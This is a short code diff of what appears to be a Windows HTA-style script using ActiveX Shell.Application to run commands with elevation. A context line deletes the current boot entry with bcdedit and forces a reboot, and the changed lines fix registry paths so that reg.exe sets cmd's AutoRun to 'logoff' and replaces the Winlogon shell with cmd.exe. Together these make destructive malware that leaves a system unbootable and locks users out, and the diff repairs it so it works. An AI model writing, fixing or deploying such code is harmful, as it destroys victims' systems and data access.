@@ -19,8 +19,8 @@
 <dont>(function(){while(true){var s=new ActiveXObject('Shell.Application');s.ShellExecute('bcdedit.exe','/delete {current} /f','', 'runas',1);s.ShellExecute('shutdown.exe','/r /t 0','', 'runas',1);close();}})()</dont>
 <script>
       var s=new ActiveXObject('Shell.Application')
-      s.ShellExecute('reg.exe','add "HKCU/Software/Microsoft/Command Processor" /v AutoRun /t REG_SZ /d "logoff" /f','', 'runas',1);
-      s.ShellExecute('reg.exe','add "HKLM/SOFTWARE/Microsoft/Windows NT/CurrentVersion/Winlogon" /v Shell /t REG_SZ /d "cmd.exe" /f','', 'runas',1);
+      s.ShellExecute('reg.exe','add "HKCU\\Software\\Microsoft\\Command Processor" /v AutoRun /t REG_SZ /d "logoff" /f','', 'runas',1);
+      s.ShellExecute('reg.exe','add "HKLM\\SOFTWARE\\Microsoft\\Windows NT\\CurrentVersion\\Winlogon" /v Shell /t REG_SZ /d "cmd.exe" /f','', 'runas',1);
 </script>
 <script>
       
